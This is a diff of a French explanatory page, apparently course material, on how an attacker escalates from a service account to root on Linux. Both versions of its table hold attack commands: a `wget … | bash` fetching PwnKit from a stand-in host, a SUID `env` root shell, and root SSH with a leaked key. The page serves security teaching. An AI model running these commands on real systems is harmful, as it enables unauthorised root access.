@@ -19,11 +19,11 @@ related:
 
 Un accès initial par une faille web ou un exploit donne souvent un compte de service limité (`www-data`, `serviceuser`) : parfois enfermé dans un dossier comme `/var/www/html`, parfois sans droit de télécharger ou de lancer un malware. Pour aller plus loin, l'attaquant cherche à devenir root. La découverte lui dit comment :
 
-| Si la découverte montre… | …l'attaquant tente |
+| Faiblesse | Découverte, puis élévation |
 | --- | --- |
-| `uname -a` : un Ubuntu 16.04 ancien, non mis à jour | Un exploit comme PwnKit : `wget http://bad.thm/pwnkit.sh \| bash` |
-| `find /bin -perm 4000` : le binaire `env` avec le bit SUID | La faille SUID : `/bin/env /bin/bash -p` |
-| `ls /etc/ssh` : un fichier `ssh-backup-key` non protégé | La clé pour se connecter en root : `ssh root@127.0.0.1 -i ssh-backup-key` |
+| Système ancien | `uname -a` montre un Ubuntu 16.04 non mis à jour : l'attaquant lance un exploit comme PwnKit, `wget http://bad.thm/pwnkit.sh \| bash`. |
+| Binaire SUID | `find /bin -perm 4000` trouve `env` avec le bit SUID : `/bin/env /bin/bash -p` donne un shell root. |
+| Clé oubliée | `ls /etc/ssh` montre un fichier `ssh-backup-key` non protégé : `ssh root@127.0.0.1 -i ssh-backup-key`. |
 
 ## Ce qu'on observe
 
